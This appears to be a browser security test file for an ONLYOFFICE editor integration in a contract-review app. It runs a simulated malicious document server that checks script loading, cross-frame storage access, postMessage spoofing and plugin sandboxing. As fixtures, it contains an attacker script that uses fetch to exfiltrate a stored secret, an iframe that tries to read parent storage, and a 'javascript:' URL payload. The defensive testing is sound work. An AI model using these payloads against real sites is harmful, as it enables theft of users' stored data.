import test, {before, after} from 'node:test';
import assert from 'node:assert/strict';
import {createServer} from 'node:http';
import {readFile, mkdtemp, rm, writeFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';
const {chromium} = await import(process.env.PLAYWRIGHT_CORE_MODULE || 'playwright-core');

const root = new URL('../../', import.meta.url);
const sdk = await readFile(new URL('public/real-files/onlyoffice-api.js', root));
const html = await readFile(new URL('public/index.html', root), 'utf8');
const start = html.indexOf('let onlyOfficeSDKPromise;');
const end = html.indexOf('\nlet onlyOfficeBridge=', start);
assert.ok(start > 0 && end > start);
const hostFunctions = html.slice(start, end);
// Extracted unmodified plugin_init runtime from ONLYOFFICE/sdkjs common/plugins.js
// blob 5bd49ef4256829b7aa22138e766e1f1e75453dd2 (AGPLv3). The simulated editor
// below follows its checkOrigin and init protocol; the document model is a stub.
const officialRuntime = await readFile(new URL('./official-plugin-runtime.fixture.js', import.meta.url), 'utf8');
const runtimeLiteral = JSON.stringify(officialRuntime).replaceAll('<','\\u003c');
const pluginGuid = 'asc.{B2211DCF-C3E4-4EF0-A61D-01D5C3030061}';
const requests = [], evidence = {kind: 'Chromium security integration harness; simulated malicious document server, not a full ONLYOFFICE editor', checks: []};
let browser, host, attacker, hostOrigin, attackerOrigin, routes = [], tempHome;
const suffix = '/web-apps/apps/api/documents/api.js';
const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', () => resolve('http://127.0.0.1:' + server.address().port)));
const send = (res, type, body) => { res.writeHead(200, {'content-type': type, 'cache-control': 'no-store'}); res.end(body); };

before(async () => {
  attacker = createServer((req, res) => {
    requests.push({surface: 'attacker', path: req.url});
    const url = new URL(req.url, attackerOrigin);
    if (url.pathname.endsWith('/api/documents/api.js') || url.pathname === '/payload.js') {
      return send(res, 'text/javascript', `window.__attackerScriptExecuted=true;fetch(${JSON.stringify(hostOrigin)}+'/exfil?secret='+encodeURIComponent(localStorage.getItem('other-contract')),{mode:'no-cors'});`);
    }
    const id = url.searchParams.get('frameEditorId') || 'editor';
    send(res, 'text/html', `<!doctype html><meta charset="utf-8"><script>
      window.parentMessages=[];
      window.pluginMessages=[];window.pluginOriginRejects=0;
      window.Api={GetDocument(){return {GetText(){return 'synthetic current contract only';}}}};
      addEventListener('message',event=>{
        parentMessages.push({origin:event.origin,data:event.data});
        if(typeof event.data!=='string')return;
        let data;try{data=JSON.parse(event.data);}catch{return;}
        if(data.guid!==${JSON.stringify(pluginGuid)})return;
        // Equivalent to official g_asc_plugins.checkOrigin for this external plugin:
        // own editor origin OR plugin.baseUrl prefixed by the event origin.
        const pluginBaseUrl=${JSON.stringify(hostOrigin+'/contract-onlyoffice/plugin/')};
        if(event.origin!==location.origin&&pluginBaseUrl.indexOf(event.origin)!==0){pluginOriginRejects++;return;}
        pluginMessages.push({origin:event.origin,type:data.type});
        const reply=message=>event.source.postMessage(JSON.stringify({guid:data.guid,...message}),event.origin);
        if(data.type==='initialize')reply({type:'plugin_init',data:${runtimeLiteral}});
        if(data.type==='initialize_internal')reply({type:'init',data:'',lang:'',editorType:'word'});
        if(data.type==='command')reply({type:'onCommandCallback',commandReturnData:eval(data.data)});
      });
      try{window.parentData=parent.localStorage.getItem('other-contract');}catch(error){window.parentReadError=error.name;}
      parent.postMessage({probe:'parent-storage',error:window.parentReadError,value:window.parentData},${JSON.stringify(hostOrigin)});
      parent.postMessage(JSON.stringify({frameEditorId:${JSON.stringify(id)},event:'onAppReady'}),${JSON.stringify(hostOrigin)});
      </script>`);
  });
  attackerOrigin = await listen(attacker);
  host = createServer((req, res) => {
    requests.push({surface: 'host', path: req.url});
    const path = new URL(req.url, hostOrigin).pathname;
    if (path === '/api/contract-review-studio/real-files/onlyoffice-api.js') return send(res, 'text/javascript', sdk);
    if (path.startsWith('/contract-onlyoffice/')) return routes.find(route => route.path === '/contract-onlyoffice').handler(req, res);
    if (path === '/exfil') return send(res, 'text/plain', 'captured');
    return send(res, 'text/html', `<!doctype html><meta charset="utf-8"><title>SDK security fixture</title><div id="editor"></div><script>
      localStorage.setItem('other-contract','synthetic-other-contract-secret');
      window.probes=[];window.readyCount=0;window.documentReadyCount=0;
      addEventListener('message',event=>{if(event.data?.probe)probes.push({origin:event.origin,...event.data});});
      ${hostFunctions}
      window.openFixture=async apiUrl=>{await loadOnlyOfficeSDK();window.editor=new DocsAPI.DocEditor('editor',{
        type:'desktop',documentType:'word',width:'100%',height:'100%',document:{title:'Synthetic current contract',fileType:'docx',key:'fixture-current-v1',url:${JSON.stringify(attackerOrigin + '/current.docx')}},editorConfig:{mode:'edit'},
        events:{onAppReady(){readyCount++;},onDocumentReady(){documentReadyCount++;}}
      },apiUrl);return editor.getFrame().src;};
      </script>`);
  });
  hostOrigin = await listen(host);
  tempHome = await mkdtemp(join(tmpdir(), 'sdk-browser-security-'));
  const env = {DSH_HOME: tempHome, CONTRACT_ONLYOFFICE_URL: attackerOrigin, CONTRACT_ONLYOFFICE_CALLBACK_URL: hostOrigin, CONTRACT_ONLYOFFICE_SECRET: 'synthetic-browser-test-secret-'.repeat(3)};
  const previous = Object.fromEntries(Object.keys(env).map(key => [key, process.env[key]]));
  Object.assign(process.env, env);
  try {
    const {registerOnlyOffice} = await import(new URL('dsh/onlyoffice.js', root));
    registerOnlyOffice({effect: callback => callback(),webServer:{register: route => routes.push(route)},connection:{requestRejection:()=>undefined,fetch:{register(){}}}});
  } finally { for(const [key,value] of Object.entries(previous)) { if(value === undefined)delete process.env[key];else process.env[key]=value; } }
  browser = await chromium.launch({executablePath: process.env.CHROMIUM_EXECUTABLE || 'C:/Program Files/Google/Chrome/Application/chrome.exe', headless: true, args: ['--no-first-run', '--disable-background-networking']});
  evidence.browser = browser.version();
  evidence.testHost = hostOrigin;
  evidence.documentServer = attackerOrigin;
});

after(async () => {
  await browser?.close();
  await Promise.all([host,attacker].filter(Boolean).map(server => new Promise(resolve => server.close(resolve))));
  if(tempHome)await rm(tempHome,{recursive:true,force:true});
  evidence.requests = requests;
  await writeFile(new URL('./onlyoffice-browser-results.json',import.meta.url),JSON.stringify(evidence,null,2));
});

async function pageFor(t) {
  const context = await browser.newContext();
  t.after(()=>context.close());
  const page = await context.newPage();
  await page.goto(hostOrigin);
  return page;
}

test('a malicious API endpoint is never loaded as a script and its iframe cannot read another contract', async t => {
  const page = await pageFor(t);
  await page.evaluate(url=>openFixture(url),attackerOrigin+suffix);
  await page.waitForFunction(()=>readyCount===1&&probes.length>0);
  const state = await page.evaluate(()=>({executed:!!window.__attackerScriptExecuted,secret:localStorage.getItem('other-contract'),probes,documentReadyCount,scriptSources:[...document.scripts].map(script=>script.src).filter(Boolean)}));
  assert.equal(state.executed,false);
  assert.equal(state.secret,'synthetic-other-contract-secret');
  assert.equal(state.probes[0].origin,attackerOrigin);
  assert.equal(state.probes[0].error,'SecurityError');
  assert.equal(state.probes[0].value,undefined);
  assert.deepEqual(state.scriptSources,[hostOrigin+'/api/contract-review-studio/real-files/onlyoffice-api.js']);
  assert.equal(requests.some(request=>request.surface==='attacker'&&request.path.startsWith(suffix)),false);
  assert.equal(requests.some(request=>request.surface==='host'&&request.path.startsWith('/exfil')),false);
  evidence.checks.push({name:'gateway endpoint is iframe data; cross-contract storage blocked',pass:true});
});

test('same-origin sibling iframe cannot spoof SDK readiness events', async t => {
  const page = await pageFor(t);
  await page.evaluate(url=>openFixture(url),attackerOrigin+suffix);
  await page.waitForFunction(()=>readyCount===1);
  await page.evaluate(url=>{const frame=document.createElement('iframe');frame.id='rogue';frame.src=url;document.body.append(frame);},attackerOrigin+'/forged');
  const rogue = await page.waitForSelector('#rogue');
  const rogueFrame = await rogue.contentFrame();
  await rogueFrame.waitForLoadState();
  await rogueFrame.evaluate(origin=>parent.postMessage(JSON.stringify({frameEditorId:'editor',event:'onDocumentReady'}),origin),hostOrigin);
  await page.waitForTimeout(50);
  assert.equal(await page.evaluate(()=>documentReadyCount),0);
  const editorFrame = page.frames().find(frame=>frame.url().includes('/documenteditor/main/'));
  await editorFrame.evaluate(origin=>parent.postMessage(JSON.stringify({frameEditorId:'editor',event:'onDocumentReady'}),origin),hostOrigin);
  await page.waitForFunction(()=>documentReadyCount===1);
  evidence.checks.push({name:'SDK source WindowProxy rejects same-origin sibling spoof',pass:true});
});

test('same-origin and arbitrary-script endpoints fail before fetching or mounting', async t => {
  const page = await pageFor(t);
  const results = await page.evaluate(async urls=>{
    await loadOnlyOfficeSDK();
    const failures=[];
    for(const url of urls){try{await openFixture(url);failures.push(false);}catch{failures.push(true);}}
    return {failures,frames:document.querySelectorAll('iframe').length,executed:!!window.__attackerScriptExecuted};
  },[hostOrigin+suffix,attackerOrigin+'/payload.js','javascript:window.__attackerScriptExecuted=true']);
  assert.deepEqual(results,{failures:[true,true,true],frames:0,executed:false});
  assert.equal(requests.some(request=>request.surface==='attacker'&&request.path==='/payload.js'),false);
  evidence.checks.push({name:'same-origin/non-endpoint/JavaScript URL rejected before load',pass:true});
});

test('trusted relay preserves official plugin origin checks while runtime eval stays opaque', async t => {
  const page = await pageFor(t);
  await page.evaluate(url=>openFixture(url),attackerOrigin+suffix);
  await page.waitForFunction(()=>readyCount===1);
  const pluginUrl = hostOrigin+'/contract-onlyoffice/plugin/index.html?'+new URLSearchParams({channel:'e'.repeat(48),parentOrigin:hostOrigin,key:'fixture-current-v1',runtime:'1'});
  const response = await fetch(pluginUrl);
  const csp = response.headers.get('content-security-policy');
  assert.equal(csp.includes('sandbox'),false,'the trusted relay retains its plugin base URL origin');
  assert.equal(csp.includes('unsafe-eval'),false,'the trusted relay cannot evaluate editor-supplied code');
  assert.match(csp,/frame-src 'self'/);
  const body = await response.text();
  assert.equal(/<script\s+src=/i.test(body),false,'the relay page has no remote script source');
  assert.equal(body.includes('eval('),false,'the relay contains no evaluation primitive');
  assert.equal(body.includes('Asc.plugin'),false,'the official SDK does not execute in the trusted relay');
  const runtimeUrl = hostOrigin+'/contract-onlyoffice/plugin/runtime.html';
  const runtimeResponse = await fetch(runtimeUrl);
  const runtimeCSP = runtimeResponse.headers.get('content-security-policy');
  assert.match(runtimeCSP,/sandbox allow-scripts;/);
  assert.equal(runtimeCSP.includes('allow-same-origin'),false);
  assert.ok((await runtimeResponse.text()).includes('Asc.plugin'),'the actual bundled SDK runs only in the isolated runtime');
  await page.evaluate(origin=>{window.testBridge=createOfficeBridge({origin,channel:'e'.repeat(48),key:'fixture-current-v1'},()=>editor.getFrame());window.bridgeResult=null;window.bridgeError=null;testBridge.run('read').then(value=>bridgeResult=value,error=>bridgeError=error.message);},hostOrigin);
  const editorFrame = page.frames().find(frame=>frame.url().includes('/documenteditor/main/'));
  await editorFrame.evaluate(url=>{const frame=document.createElement('iframe');frame.src=url;document.body.append(frame);},pluginUrl);
  await page.waitForFunction(()=>bridgeResult?.ok===true||bridgeError,{timeout:10000});
  assert.equal(await page.evaluate(()=>bridgeError),null);
  const relayFrame=page.frames().find(frame=>frame.url().startsWith(pluginUrl));
  const pluginFrame=page.frames().find(frame=>frame.url().startsWith(runtimeUrl));
  assert.ok(relayFrame&&pluginFrame,'the official plugin is hosted through a relay and isolated child');
  assert.equal(await relayFrame.evaluate(()=>self.origin),hostOrigin);
  const boundary = await pluginFrame.evaluate(()=>{let storage,parentDOM;try{localStorage.getItem('other-contract');storage='accessible';}catch(error){storage=error.name;}try{parent.parent.parent.document.body;parentDOM='accessible';}catch(error){parentDOM=error.name;}return {origin:self.origin,storage,parentDOM,sdk:typeof Asc.plugin,marker:document.documentElement.getAttribute('data-dsh-plugin')};});
  assert.equal(boundary.origin,'null');
  assert.equal(boundary.storage,'SecurityError');
  assert.equal(boundary.parentDOM,'SecurityError');
  assert.equal(boundary.sdk,'object');
  assert.equal(boundary.marker,'ready','official plugin_init and init ran the real plugin startup');
  assert.equal(await page.evaluate(()=>bridgeResult.text),'synthetic current contract only');
  const protocol = await editorFrame.evaluate(()=>({pluginMessages,pluginOriginRejects}));
  assert.equal(protocol.pluginOriginRejects,0);
  assert.deepEqual(protocol.pluginMessages.map(message=>message.type),['initialize','initialize_internal','command']);
  for(const message of protocol.pluginMessages)assert.equal(message.origin,hostOrigin,'the real SDK messages retain the relay base URL origin');
  await page.evaluate(()=>testBridge.dispose());
  assert.equal(requests.some(request=>request.surface==='attacker'&&request.path.includes('plugins.js')),false);
  evidence.checks.push({name:'trusted relay with official plugin_init protocol, origin check and read callback',pass:true,csp,runtimeCSP,boundary,protocol});
});
